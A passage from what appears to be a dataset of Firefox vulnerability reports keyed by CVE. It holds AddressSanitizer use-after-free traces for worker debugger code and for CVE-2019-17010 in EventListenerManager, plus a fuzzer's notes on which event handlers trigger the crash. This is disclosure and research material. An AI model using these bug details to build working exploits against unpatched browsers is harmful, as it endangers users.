NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #31 0x7fe78b2f8eb0 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5 #32 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #33 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #34 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #35 0x7fe78a2ac21a in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11 Thread T22 (DOM Worker) created by T0 (Web Content) here: #0 0x5604aa49aadd in pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:210:3 #1 0x7fe7ab04b158 in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:433:14 #2 0x7fe7ab034d3e in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:518:12 #3 0x7fe78a2ae529 in nsThread::Init(nsTSubstring<char> const&) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:661:8 #4 0x7fe791f18c48 in mozilla::dom::WorkerThread::Create(mozilla::dom::WorkerThreadFriendKey const&) /builds/worker/workspace/build/src/dom/workers/WorkerThread.cpp:93:7 #5 0x7fe791e8d1d9 in mozilla::dom::workerinternals::RuntimeService::ScheduleWorker(mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:1433:14 #6 0x7fe791e8b7f5 in mozilla::dom::workerinternals::RuntimeService::RegisterWorker(mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:1298:19 #7 0x7fe791ee9d49 in mozilla::dom::WorkerPrivate::Constructor(JSContext*, nsTSubstring<char16_t> const&, bool, mozilla::dom::WorkerType, nsTSubstring<char16_t> const&, nsTSubstring<char> const&, mozilla::dom::WorkerLoadInfo*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2250:24 #8 0x7fe791e9ba17 in mozilla::dom::Worker::Constructor(mozilla::dom::GlobalObject const&, nsTSubstring<char16_t> const&, mozilla::dom::WorkerOptions const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/Worker.cpp:30:41 #9 0x7fe78f4ae630 in mozilla::dom::Worker_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WorkerBinding.cpp:1112:52 #10 0x7fe796569595 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #11 0x7fe796569595 in CallJSNativeConstructor /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458 #12 0x7fe796569595 in InternalConstruct(JSContext*, js::AnyConstructArgs const&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:651 #13 0x7fe796546916 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3070:16 #14 0x7fe796530528 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #15 0x7fe79656bb7c in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13 #16 0x7fe79656c329 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:814:10 #17 0x7fe7967ea5ca in ExecuteScript(JSContext*, JS::Handle<JS::StackGCVector<JSObject*, js::TempAllocPolicy> >, JS::Handle<JSScript*>, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:455:10 #18 0x7fe78dab2254 in nsJSUtils::ExecutionContext::ExecScript() /builds/worker/workspace/build/src/dom/base/nsJSUtils.cpp:386:8 #19 0x7fe792360e33 in mozilla::dom::ExecuteCompiledScript(JSContext*, mozilla::dom::ScriptLoadRequest*, nsJSUtils::ExecutionContext&) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2495:16 #20 0x7fe79235def1 in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2715:20 #21 0x7fe79235688c in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2222:10 #22 0x7fe792353262 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, mozilla::dom::ScriptKind) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1803:10 #23 0x7fe79232d67e in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1526:10 #24 0x7fe79232c94e in mozilla::dom::ScriptElement::MaybeProcessScript() /builds/worker/workspace/build/src/dom/script/ScriptElement.cpp:118:18 #25 0x7fe78c6218fa in AttemptToExecute /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIScriptElement.h:224:18 #26 0x7fe78c6218fa in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:727 #27 0x7fe78c61b5a3 in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:530:7 #28 0x7fe78c627720 in nsHtml5ExecutorFlusher::Run() /builds/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:133:18 #29 0x7fe78a2811f1 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:295:32 #30 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #31 0x7fe78a2b83d8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #32 0x7fe78b2f7caa in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21 #33 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #34 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #35 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #36 0x7fe7926bf749 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #37 0x7fe7962dd4df in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:919:20 #38 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #39 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #40 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #41 0x7fe7962dce86 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:757:34 #42 0x5604aa4e53a7 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28 #43 0x5604aa4e53a7 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:263 #44 0x7fe7a9c4282f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:188:15 in SetDebugger Shadow bytes around the buggy address: 0x0c36800275f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3680027600: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3680027610: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3680027620: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3680027630: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c3680027640: fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3680027650: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3680027660: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3680027670: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3680027680: fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3680027690: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==3247==ABORTING"
      }
    ],
    "CVE-2019-17010": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1581084",
        "title": "mozilla::EventListenerManager::AddEventListenerInternal",
        "description": "I'm seeing this crash quite regularly while fuzzing, however the testcases are not reproducible. If we can find a way to reliable trigger a situation where nsDocShell::CreateAboutBlankContentViewer is called in EnsureContentViewer I should be to craft a testcase. I am seeing this on ondevicemotion and ondeviceorientation events and also with a slightly different stack with onstorage event on the window object. ================================================================= ==8535==ERROR: AddressSanitizer: heap-use-after-free on address 0x611001e24504 at pc 0x7ff429b5b3e7 bp 0x7fff90876a10 sp 0x7fff90876a08 READ of size 1 at 0x611001e24504 thread T0 (Web Content) #0 0x7ff429b5b3e6 in IsApzAwareListener /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1680:29 #1 0x7ff429b5b3e6 in mozilla::EventListenerManager::AddEventListenerInternal(mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener>, mozilla::EventMessage, nsAtom*, mozilla::EventListenerFlags const&, bool, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:396 #2 0x7ff429b5eb97 in mozilla::EventListenerManager::SetEventHandlerInternal(nsAtom*, mozilla::TypedEventHandler const&, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:728:5 #3 0x7ff429b6a5a7 in mozilla::EventListenerManager::SetEventHandler(nsAtom*, mozilla::dom::EventHandlerNonNull*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1529:3 #4 0x7ff4287d5d5b in SetOndeviceorientation /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventNameList.h:326:1 #5 0x7ff4287d5d5b in mozilla::dom::Window_Binding::set_ondeviceorientation(JSContext*, JS::Handle<JSObject*>, nsGlobalWindowInner*, JSJitSetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:6780 #6 0x7ff4293cb266 in bool mozilla::dom::binding_detail::GenericSetter<mozilla::dom::binding_detail::MaybeGlobalThisPolicy>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3121:8 #7 0x7ff42ffb33a7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447:13 #8 0x7ff42ffb33a7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:539 #9 0x7ff42ffb943d in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:594:10 #10 0x7ff42ffb943d in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:610 #11 0x7ff42ffb943d in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:748 #12 0x7ff4304fca53 in SetExistingProperty(JSContext*, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyResult>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2932:8 #13 0x7ff4304f5521 in bool js::NativeSetProperty<(js::QualifiedBool)1>(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2961:14 #14 0x7ff4301fea57 in SetProperty /builds/worker/workspace/build/src/js/src/vm/ObjectOperations-inl.h:283:10 #15 0x7ff4301fea57 in js::ForwardingProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:149 #16 0x7ff426807ac0 in nsOuterWindowProxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:944:23 #17 0x7ff4301d38c1 in setInternal /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:395:19 #18 0x7ff4301d38c1 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:403 #19 0x7ff42ff91878 in SetProperty /builds/worker/workspace/build/src/js/src/vm/ObjectOperations-inl.h:280:12 #20 0x7ff42ff91878 in SetPropertyOperation /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:269 #21 0x7ff42ff91878 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2849 #22 0x7ff42ff7ccef in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:424:10 #23 0x7ff42ffb9c6f in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:786:13 #24 0x7ff43009eb33 in js::DirectEvalStringFromIon(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::Handle<JS::Value>, JS::Handle<JSString*>, unsigned char*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:422:10 #25 0x308de91b36ac (<unknown module>) 0x611001e24504 is located 196 bytes inside of 256-byte region [0x611001e24440,0x611001e24540) freed by thread T0 (Web Content) here: #0 0x55b630990a92 in __interceptor_free /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3 #1 0x7ff422678916 in Free /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:197:34 #2 0x7ff422678916 in nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::ShrinkCapacity(unsigned long, unsigned long) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:229 #3 0x7ff429b58319 in Clear /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTObserverArray.h:248:12 #4 0x7ff429b58319 in RemoveAllListenersSilently /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:147 #5 0x7ff429b58319 in mozilla::EventListenerManager::Disconnect() /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1315 #6 0x7ff4267a8b60 in nsGlobalWindowInner::FreeInnerObjects() /builds/worker/workspace/build/src/dom/base/nsGlobalWindowInner.cpp:1102:23 #7 0x7ff42681240b in nsGlobalWindowOuter::SetNewDocument(mozilla::dom::Document*, nsISupports*, bool, mozilla::dom::WindowGlobalChild*) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:2231:19 #8 0x7ff42c4ebb35 in nsDocumentViewer::InitInternal(nsIWidget*, nsISupports*, mozilla::dom::WindowGlobalChild*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, bool, bool, bool) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:983:22 #9 0x7ff42c4eaefa in nsDocumentViewer::Init(nsIWidget*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::dom::WindowGlobalChild*) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:743:10 #10 0x7ff42f136c96 in nsDocShell::SetupNewViewer(nsIContentViewer*, mozilla::dom::WindowGlobalChild*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:8438:7 #11 0x7ff42f135b79 in nsDocShell::Embed(nsIContentViewer*, mozilla::dom::WindowGlobalChild*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6217:17 #12 0x7ff42f140bcc in nsDocShell::CreateAboutBlankContentViewer(nsIPrincipal*, nsIPrincipal*, nsIContentSecurityPolicy*, nsIURI*, bool, bool, mozilla::dom::WindowGlobalChild*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7052:14 #13 0x7ff42f0eb329 in nsDocShell::EnsureContentViewer() /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6887:17 #14 0x7ff42f117ba7 in GetDocument /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:3590:3 #15 0x7ff42f117ba7 in non-virtual thunk to nsDocShell::GetDocument() /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #16 0x7ff4266f3ace in nsContentUtils::ShouldResistFingerprinting(nsIDocShell*) /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:1967:48 #17 0x7ff42b374fe2 in nsDeviceSensors::IsSensorAllowedByPref(unsigned int, nsIDOMWindow*) /builds/worker/workspace/build/src/dom/system/nsDeviceSensors.cpp:574:11 #18 0x7ff42b37550c in nsDeviceSensors::AddWindowListener(unsigned int, nsIDOMWindow*) /builds/worker/workspace/build/src/dom/system/nsDeviceSensors.cpp:156:8 #19 0x7ff4267ed998 in nsGlobalWindowInner::EnableDeviceSensor(unsigned int) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowInner.cpp:5973:9 #20 0x7ff429b59449 in EnableDevice /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:478:15 #21 0x7ff429b59449 in mozilla::EventListenerManager::AddEventListenerInternal(mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener>, mozilla::EventMessage, nsAtom*, mozilla::EventListenerFlags const&, bool, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:290 #22 0x7ff429b5eb97 in mozilla::EventListenerManager::SetEventHandlerInternal(nsAtom*, mozilla::TypedEventHandler const&, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:728:5 #23 0x7ff429b6a5a7 in mozilla::EventListenerManager::SetEventHandler(nsAtom*, mozilla::dom::EventHandlerNonNull*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1529:3 #24 0x7ff4287d5d5b in SetOndeviceorientation /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventNameList.h:326:1 #25 0x7ff4287d5d5b in mozilla::dom::Window_Binding::set_ondeviceorientation(JSContext*, JS::Handle<JSObject*>, nsGlobalWindowInner*, JSJitSetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:6780 #26 0x7ff4293cb266 in bool mozilla::dom::binding_detail::GenericSetter<mozilla::dom::binding_detail::MaybeGlobalThisPolicy>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3121:8 #27 0x7ff42ffb33a7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447:13 #28 0x7ff42ffb33a7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:539 #29 0x7ff42ffb943d in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:594:10 #30 0x7ff42ffb943d in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:610 #31 0x7ff42ffb943d in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:748 #32 0x7ff4304fca53 in SetExistingProperty(JSContext*, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyResult>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2932:8 #33 0x7ff4304f5521 in bool js::NativeSetProperty<(js::QualifiedBool)1>(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2961:14 #34 0x7ff4301fea57 in SetProperty /builds/worker/workspace/build/src/js/src/vm/ObjectOperations-inl.h:283:10 #35 0x7ff4301fea57 in js::ForwardingProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:149 #36 0x7ff426807ac0 in nsOuterWindowProxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:944:23 #37 0x7ff4301d38c1 in setInternal /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:395:19 #38 0x7ff4301d38c1 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:403 #39 0x7ff42ff91878 in SetProperty /builds/worker/workspace/build/src/js/src/vm/ObjectOperations-inl.h:280:12 #40 0x7ff42ff91878 in SetPropertyOperation /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:269 #41 0x7ff42ff91878 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2849 #42 0x7ff42ff7ccef in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:424:10 previously allocated by thread T0 (Web Content) here: #0 0x55b63099122f in __interceptor_realloc /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:165:3 #1 0x55b6309c668d in moz_xrealloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:72:18 #2 0x7ff4226777a9 in Realloc /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:204:12 #3 0x7ff4226777a9 in nsTArrayInfallibleAllocator::ResultTypeProxy nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::EnsureCapacity<nsTArrayInfallibleAllocator>(unsigned long, unsigned long) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:191 #4 0x7ff429b588db in ExtendCapacity<nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:117:16 #5 0x7ff429b588db in AppendElements<nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1691 #6 0x7ff429b588db in AppendElement<nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1716 #7 0x7ff429b588db in AppendElement /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTObserverArray.h:192 #8 0x7ff429b588db in mozilla::EventListenerManager::AddEventListenerInternal(mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener>, mozilla::EventMessage, nsAtom*, mozilla::EventListenerFlags const&, bool, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:236 #9 0x7ff429b5eb97 in mozilla::EventListenerManager::SetEventHandlerInternal(nsAtom*, mozilla::TypedEventHandler const&, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:728:5 #10 0x7ff429b6a5a7 in mozilla::EventListenerManager::SetEventHandler(nsAtom*, mozilla::dom::EventHandlerNonNull*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1529:3 #11 0x7ff42880a06b in SetOndragover /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventNameList.h:173:1 #12 0x7ff42880a06b in mozilla::dom::Window_Binding::set_ondragover(JSContext*, JS::Handle<JSObject*>, nsGlobalWindowInner*, JSJitSetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:13423 #13 0x7ff4293cb266 in bool mozilla::dom::binding_detail::GenericSetter<mozilla::dom::binding_detail::MaybeGlobalThisPolicy>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3121:8 #14 0x7ff42ffb33a7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447:13 #15 0x7ff42ffb33a7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:539 #16 0x7ff42ffb943d in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:594:10 #17 0x7ff42ffb943d in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:610 #18 0x7ff42ffb943d in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:748 #19 0x7ff4304fca53 in SetExistingProperty(JSContext*, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyResult>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2932:8 #20 0x7ff4304f5521 in bool js::NativeSetProperty<(js::QualifiedBool)1>(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2961:14 #21 0x7ff4301fea57 in SetProperty /builds/worker/workspace/build/src/js/src/vm/ObjectOperations-inl.h:283:10 #22 0x7ff4301fea57 in js::ForwardingProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:149 #23 0x7ff426807ac0 in nsOuterWindowProxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:944:23 #24 0x7ff4301d38c1 in setInternal /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:395:19 #25 0x7ff4301d38c1 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:403 #26 0x7ff42ff91878 in SetProperty /builds/worker/workspace/build/src/js/src/vm/ObjectOperations-inl.h:280:12 #27 0x7ff42ff91878 in SetPropertyOperation /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:269 #28 0x7ff42ff91878 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2849 #29 0x7ff42ff7ccef in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:424:10 #30 0x7ff42ffb9c6f in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:786:13 #31 0x7ff43009eb33 in js::DirectEvalStringFromIon(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::Handle<JS::Value>, JS::Handle<JSString*>, unsigned char*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:422:10 #32 0x308de91b36ac (<unknown module>) SUMMARY: AddressSanitizer: heap-use-after-free 